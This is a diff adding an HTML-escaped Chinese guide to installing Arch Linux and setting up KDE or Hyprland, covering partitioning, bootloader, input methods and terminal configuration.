+&lt;th&gt;建议大小&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;/boot&lt;/td&gt;
+&lt;td&gt;Fat32&lt;/td&gt;
+&lt;td&gt;EFI系统分区&lt;/td&gt;
+&lt;td&gt;1GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;td&gt;swap&lt;/td&gt;
+&lt;td&gt;swap交换空间&lt;/td&gt;
+&lt;td&gt;&amp;gt;4GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;/&lt;/td&gt;
+&lt;td&gt;ext4/btrfs&lt;/td&gt;
+&lt;td&gt;根目录&lt;/td&gt;
+&lt;td&gt;视实际需求，至少23-32GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;除此之外可以自行将&lt;code&gt;/home&lt;/code&gt;、&lt;code&gt;/var&lt;/code&gt;等常用目录单独分区&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;fdisk&lt;/code&gt;中&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#列出当前分区情况
+p
+
+#删除分区，提供一个存在的分区编号
+d partition
+
+#新建分区
+n
+#依次要求输入起始扇区、结束扇区、编号
+#起始扇区默认即可，结束扇区可使用+nGB等偏移量，编号默认即可
+
+#保存分区表，退出
+w
+#注意：在保存分区表之前不会对磁盘进行任何操作，写入后无法撤回，注意保存重要数据
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;按照上述说明建立分区，注意如果原有EFI分区则无需创建新的EFI分区&lt;/p&gt;
+&lt;h4&gt;格式化分区&lt;/h4&gt;
+&lt;p&gt;:::warning&lt;/p&gt;
+&lt;p&gt;格式化会删除分区中所有数据，请注意备份重要数据&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;格式化根目录分区为Ext4/btrfs&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#格式化为Ext4
+mkfs.ext4 partition
+#格式化为btrfs
+mkfs.btrfs partition
+
+#提供上一步新建的根目录分区完整分区路径
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;格式化swap分区&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mkswap partition
+#提供上一步新建的swap分区完整分区路径
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;格式化EFI分区&lt;/p&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;若原有EFI分区则无需格式化EFI分区，格式化EFI分区会删除所有启动项，可能导致其他操作系统无法启动&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mkfs.fat -F 32 partition
+#提供上一步新建的EFI分区完整分区路径
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;挂载分区&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;#挂载根目录分区
+mount root_partition /mnt
+#挂载EFI分区
+mount --mkdir efi_patition /mnt/boot
+#启用swap分区
+swapon swap_partition
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;安装软件包&lt;/h4&gt;
+&lt;p&gt;编辑&lt;code&gt;/etc/pacman.d/mirrorlist&lt;/code&gt;文件，在顶部加入国内镜像&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch
+Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch
+Server = https://mirrors.aliyun.com/archlinux/$repo/os/$arch
+Server = https://mirrors.hust.edu.cn/archlinux/$repo/os/$arch
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;选择一两个即可&lt;/p&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;该配置会被传递到新系统以确保可以正常访问软件仓库&lt;/p&gt;
+&lt;p&gt;除此之外的Live介质中的配置均不会被保留&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;安装必要软件包&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pacstrap -K /mnt base linux linux-firmware
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可选&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;base-devel&lt;/code&gt;: base包拓展，包含一些Live环境中有而base包中没有的程序，推荐安装&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;amd-ucode/intel-ucode&lt;/code&gt;:CPU微码更新，根据CPU选择，推荐安装&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;networkmanager&lt;/code&gt;:联网工具，推荐安装&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;vim&lt;/code&gt;:文本编辑器&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;配置新系统&lt;/h4&gt;
+&lt;p&gt;生成&lt;code&gt;fatab&lt;/code&gt;文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;genfstab -U /mnt &amp;gt;&amp;gt; /mnt/etc/fstab
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;切换到新系统&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;arch-chroot /mnt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置时区&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;更新时间&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hwclock --systohc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;语言设置&lt;/p&gt;
+&lt;p&gt;编辑&lt;code&gt;/etc/locale.gen&lt;/code&gt;，找到需要的语言，去掉前面的注释符号&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;en_US.UTF-8 UTF-8
+zh_CN.UTF-8 UTF-8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;生成locale信息&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;locale-gen
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;创建&lt;code&gt;/etc/locale.conf&lt;/code&gt;，设置语言&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;LANG=en_US.UTF-8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;在此处不要把语言直接设置为中文，tty默认不支持中文，会导致输出变成一堆方块，可以在配置好tty中文渲染支持或者进入图形界面后再改为中文&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;设置主机名&lt;/p&gt;
+&lt;p&gt;编辑&lt;code&gt;/etc/hostname&lt;/code&gt;，直接输入主机名&lt;/p&gt;
+&lt;p&gt;设置root密码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;passwd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;创建非root用户&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;useradd user_name
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改密码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;passwd user_name
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;配置sudo权限&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;visudo
+#找到 root ALL=(ALL:ALL) ALL
+#添加以下内容
+user_name ALL=(ALL:ALL) ALL
+#若需要免密码，可以在最后一个ALL前加入NOPASSWD:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;1.2.安装引导程序&lt;/h3&gt;
+&lt;h4&gt;安装GRUB&lt;/h4&gt;
+&lt;p&gt;安装grub软件包&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pacman -S grub efibootmgr
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;安装grub到EFI分区&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub
+#仅适用于x86_64架构
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;生成grub配置&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;grub-mkconfig -o /boot/grub/grub.cfg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;多系统设置&lt;/h4&gt;
+&lt;p&gt;没有多系统可跳过本节&lt;/p&gt;
+&lt;p&gt;安装&lt;code&gt;os-prober&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pacman -S os-prober
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;开启&lt;code&gt;os-prober&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;编辑&lt;code&gt;/etc/default/grub&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#取消注释以下内容
+GRUB_DISABLE_OS_PROBER=false
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重新生成grub配置&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;grub-mkconfig -o /boot/grub/grub.cfg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;在chroot环境下os-prober不一定能正常工作，如果没有别的启动项可以进入系统后再次生成grub配置&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h4&gt;进入系统&lt;/h4&gt;
+&lt;p&gt;退出&lt;code&gt;chroot&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重启&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;reboot
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;此时可以移除安装介质&lt;/p&gt;
+&lt;h2&gt;2.基本配置&lt;/h2&gt;
+&lt;h3&gt;2.1.重新联网&lt;/h3&gt;
+&lt;p&gt;开启&lt;code&gt;NetworkManager&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo systemctl enable NetworkManager
+sudo systemctl start NetworkManager
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;扫描可用网络&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmcli device wifi scan
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;链接网络&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmcli device wifi connect SSID --ask
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;更新软件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -Syu
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;2.2.安装AUR助手（yay）&lt;/h3&gt;
+&lt;p&gt;安装&lt;code&gt;git&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;克隆&lt;code&gt;yay-bin&lt;/code&gt;仓库&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git clone https://aur.archlinux.org/yay-bin.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;安装&lt;code&gt;yay&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd yay-bin
+makepkg -si
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;理论上也可以克隆&lt;code&gt;yay&lt;/code&gt;仓库而非&lt;code&gt;yay-bin&lt;/code&gt;仓库来本地编译&lt;code&gt;yay&lt;/code&gt;，但是在国内会被墙，需要更换go的国内源&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;2.3.安装中文字体&lt;/h3&gt;
+&lt;p&gt;在安装图形界面之前建议安装中文字体以免无法显示&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#安装思源字体
+sudo pacman -S noto-fonts-cjk
+#安装文泉驿微米黑
+sudo pacman -S wqy-microhei
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;选择一款即可&lt;/p&gt;
+&lt;p&gt;也可以安装其它字体&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#创建字体目录
+sudo mkdir -p /usr/local/share/fonts/
+#拷贝字体
+sudo cp font_file /usr/local/share/fonts/...
+#刷新字体缓存
+fc-cache
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;支持ttf、otf格式，会递归搜索子文件夹&lt;/p&gt;
+&lt;p&gt;验证&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fc-list | grep font_name
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;2.4.配置双系统时间同步&lt;/h3&gt;
+&lt;p&gt;由于Windows默认采用本地时间 RTC（在中国为UTC+8），而Linux的时间采用UTC时间，所以在二者写入硬件时间后都会在另一个系统产生8h时差&lt;/p&gt;
+&lt;p&gt;我们通过更改Windows 的时间为UTC时间来解决&lt;/p&gt;
+&lt;p&gt;在PowerShell中以管理员权限运行以下命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;2.5.配置自动挂载&lt;/h3&gt;
+&lt;p&gt;查看分区信息&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo fdisk -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果需要挂载NTFS格式的分区，则安装&lt;code&gt;ntfs-3g&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S ntfs-3g
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;编辑&lt;code&gt;fstab&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo vim /etc/fstab
+#按以下格式添加记录
+#partition mount_point fromat defaults 0 0
+/dev/nvme0n1p2 /mnt/c ntfs defaults 0 0
+#将/dev/nvme0n1p2以NTFS格式挂载到/mnt/c文件夹（注意新建文件夹）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;挂载&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo mount -a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;3.安装桌面环境&lt;/h2&gt;
+&lt;h3&gt;3.1.安装显示管理器&lt;/h3&gt;
+&lt;h4&gt;SDDM&lt;/h4&gt;
+&lt;p&gt;SDDM是一款图形界面启动管理器&lt;/p&gt;
+&lt;p&gt;安装sddm显示管理器&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S sddm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;开启sddm&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo systemctl enable sddm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;sddm会自动探测已安装的桌面环境并在启动时提供选择&lt;/p&gt;
+&lt;h4&gt;UWSM&lt;/h4&gt;
+&lt;p&gt;uwsm(Universal Wayland Session Manager)是一款适用于wayland的控制台显示管理器。&lt;/p&gt;
+&lt;p&gt;安装uwsm&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;yay -S uwsm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在&lt;code&gt;shell profile&lt;/code&gt;最前面中启动uwsm，uwsm会在登录到tty时立刻启动&lt;/p&gt;
+&lt;p&gt;启动选择菜单&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#~/.bashrc for bash or ~/.zshrc for zsh
+if uwsm check may-start &amp;amp;&amp;amp; uwsm select; then
+    exec systemd-cat -t uwsm_start uwsm start default
+fi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;或者直接启动某个&lt;code&gt;session&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#~/.bashrc for bash or ~/.zshrc for zsh
+if uwsm check may-start; then
+    exec uwsm start session
+fi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注意把&lt;code&gt;session&lt;/code&gt;替换为要启动的会话&lt;/p&gt;
+&lt;p&gt;:::note
+session的列表在&lt;code&gt;/usr/share/wayland-session&lt;/code&gt;目录下查看
+:::&lt;/p&gt;
+&lt;h3&gt;3.2.安装KDE桌面环境&lt;/h3&gt;
+&lt;p&gt;安装plasma桌面&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S plasma
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;安装KDE应用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S kde-applications
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;3.3.安装Hyprland桌面环境&lt;/h3&gt;
+&lt;p&gt;Hyprland没有NVIDIA显卡的官方支持，如果要安装Hyprland，请先安装&lt;a href=&quot;#n%E5%8D%A1%E9%A9%B1%E5%8A%A8&quot;&gt;N卡驱动&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;安装Hyprland&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S hyprland
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由于Hyprland默认使用&lt;code&gt;Kitty&lt;/code&gt;，所以建议提前安装&lt;code&gt;kitty&lt;/code&gt;，其它终端模拟器可以进入Hyprland后再用Kitty安装&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S kitty
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;也可以在进入&lt;code&gt;Hyprland&lt;/code&gt;后按&lt;code&gt;SUPER + M&lt;/code&gt;返回tty更改配置中的默认终端（详见下一节的配置）&lt;/p&gt;
+&lt;p&gt;:::important
+Hypland官方推荐从命令行启动，故没有对sddm的官方支持，可能无法启动，推荐使用uwsm方式启动。
+:::&lt;/p&gt;
+&lt;h2&gt;4.桌面环境配置&lt;/h2&gt;
+&lt;h3&gt;4.1Hyprland配置&lt;/h3&gt;
+&lt;h4&gt;配置文件&lt;/h4&gt;
+&lt;p&gt;Hyprland配置文件位于&lt;code&gt;~/.config/hypr/hyprland.config&lt;/code&gt;&lt;/p&gt;
+&lt;h5&gt;关闭提示&lt;/h5&gt;
+&lt;p&gt;默认使用自动生成的配置，屏幕上方会有一个提示，在配置文件中更改&lt;code&gt;autogenerated=1&lt;/code&gt;来关闭提示&lt;/p&gt;
+&lt;h5&gt;显示器配置&lt;/h5&gt;
+&lt;p&gt;查看显示器名称和支持的分辨率和刷新率&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hyprctl monitors
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置配置文件中的&lt;code&gt;MONITORS&lt;/code&gt;分类&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;monitor=eDP-1, 2880x1800@120, 0x0, 1.6
+# 分别为显示器名称，分辨率和刷新率，位置，缩放比例
+# 显示器名称可留空（保留逗号），意为对所有显示器设置
+# 位置用于多显示器，可设为auto
+# 缩放比例可设为auto，高分屏建议自己设置
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;程序配置&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;MY PROGRAMS&lt;/code&gt;分类&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$terminal = kitty
+# 终端
+$fileManager = dolphin
+# 文件管理器
+$menu = rofi -show drun
+# 应用启动器
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;自启动&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;AUTOSTART&lt;/code&gt;分类&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = ...
+# 只执行一次的命令
+exec = ...
+# 每次打开hyprland都会执行一次的命令
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;外观&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;LOOK AND FEEl&lt;/code&gt;分类，详见&lt;a href=&quot;https://wiki.hyprland.org/&quot;&gt;Hyprland WIKI&lt;/a&gt;&lt;/p&gt;
+&lt;h5&gt;输入&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;INPUT&lt;/code&gt;分类&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gestures {
+	workspace_swipe = true
+	# 可以启用触摸板三指手势切换工作区
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其他详见&lt;a href=&quot;https://wiki.hyprland.org/&quot;&gt;Hyprland WIKI&lt;/a&gt;&lt;/p&gt;
+&lt;h5&gt;按键绑定&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;KEYBINDINGS&lt;/code&gt;分类&lt;/p&gt;
+&lt;p&gt;格式&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bind = $mainMod, Q, exec, $terminal
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;$mainMod&lt;/code&gt;默认为&lt;code&gt;SUPER&lt;/code&gt;，表示&lt;code&gt;Windows&lt;/code&gt;键&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;exec&lt;/code&gt;表示执行后面的命令&lt;/p&gt;
+&lt;h4&gt;系统应用&lt;/h4&gt;
+&lt;p&gt;hyprland不是一个完整的桌面环境，它只提供一个混成器，我们需要自己安装一些实用的系统软件&lt;/p&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;壁纸&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S hyprpaper
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在&lt;code&gt;hyprland&lt;/code&gt;配置文件中加入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = hyprpaper
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;新建配置文件&lt;code&gt;~/.config/hypr/hyprpaper.conf&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;preload = ～/Pictures/2.png
+wallpaper = ,～/Pictures/2.png
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改图片地址为壁纸，注意第二行逗号前面表示显示器名称，留空表示对所有显示器，逗号不可省略&lt;/p&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;文件管理器&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;p&gt;GUI文件管理器：&lt;code&gt;dolphin&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S dolphin
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;TUI文件管理器：&lt;code&gt;ranger&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S ranger
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;状态栏&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S waybar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以进一步查找主题配置样式&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;hyprland&lt;/code&gt;配置文件中加入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = waybar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;声音系统&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S pipewire
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;背光调节&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacamn -S brightnessctl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;应用启动器&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S rofi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可进一步查找主题配置样式&lt;/p&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;剪贴板&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S cliphist
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在&lt;code&gt;hyprland&lt;/code&gt;配置文件中加入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = wl-paste --type text --watch cliphist store # 存储文本
+exec-once = wl-paste --type image --watch cliphist store # 存储图片
+
+bind = SUPER SHIFT, V, exec, cliphist list | rofi -dmenu | cliphist decode | wl-copy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之后可以通过&lt;code&gt;Windows+Shift+V&lt;/code&gt;启动&lt;code&gt;rofi&lt;/code&gt;的菜单查看剪切板历史&lt;/p&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;通知守护进程&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;p&gt;用来显示系统通知&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S mako
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以进一步查找主题配置样式&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;hyprland&lt;/code&gt;配置文件中加入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = mako
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;XDG桌面门户&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;p&gt;提供文件选择器，屏幕录制接口等功能&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S xdg-desktop-portal-hyprland
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;身份验证器&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;p&gt;用于临时需要获取&lt;code&gt;root&lt;/code&gt;权限的GUI应用程序&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S hyprpolkitagent
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后在&lt;code&gt;hyprland&lt;/code&gt;配置文件中加入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = systemctl --user start hyprpolkitagent
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;U盘自动挂载&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S udiskie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在&lt;code&gt;hyprland&lt;/code&gt;配置文件中加入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = udiskie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;&lt;em&gt;&lt;strong&gt;QT支持库&lt;/strong&gt;&lt;/em&gt;&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S qt5-wayland qt6-wayland
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;5.其他应用&lt;/h2&gt;
+&lt;h3&gt;5.1.Fctix5&lt;/h3&gt;
+&lt;p&gt;安装&lt;code&gt;fcitx5&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S fcitx5-im fcitx5-chinese-addons fcitx5-pinyin-zhwiki
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;配置环境变量&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo vim /etc/environment
+# 加入以下内容
+GTK_IM_MODULE=fcitx
+QT_IM_MODULE=fcitx
+XMODIFIERS=@im=fcitx
+SDL_IM_MODULE=fcitx
+GLFW_IM_MODULE=ibus
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后在桌面环境的配置中使用&lt;code&gt;fcitx5&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;对于&lt;code&gt;Hyprland&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;~/.config/hypr/hyprland.conf&lt;/code&gt;的&lt;code&gt;AUTOSTART&lt;/code&gt;模块中加入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;exec-once = fcitx5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之后使用&lt;code&gt;Ctrl + Space&lt;/code&gt;切换输入法，使用&lt;code&gt;Shift&lt;/code&gt;切换中英文&lt;/p&gt;
+&lt;h3&gt;5.2.Alacritty&lt;/h3&gt;
+&lt;p&gt;配置文件位于&lt;code&gt;~/.config/alacritty/alacritty.toml&lt;/code&gt;（若没有则自行创建）&lt;/p&gt;
+&lt;p&gt;常用设置：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[font]
+normal={family=&quot;0xProto Nerd Font Mono&quot;,style=&quot;Regular&quot;}
+bold={family=&quot;0xProto Nerd Font Mono&quot;,style=&quot;Bold&quot;}
+italic={family=&quot;0xProto Nerd Font Mono&quot;,style=&quot;Italic&quot;}
+#字体
+
+[cursor]
+style = &quot;underline&quot;
+#光标样式
+
+[window]
+opacity = 0.7
+blur = true
+#窗口透明度，模糊
+
+[terminal.shell]
+program = &quot;/bin/zsh&quot;
+#默认shell
+&lt;/code&gt;&lt;/pre&gt;
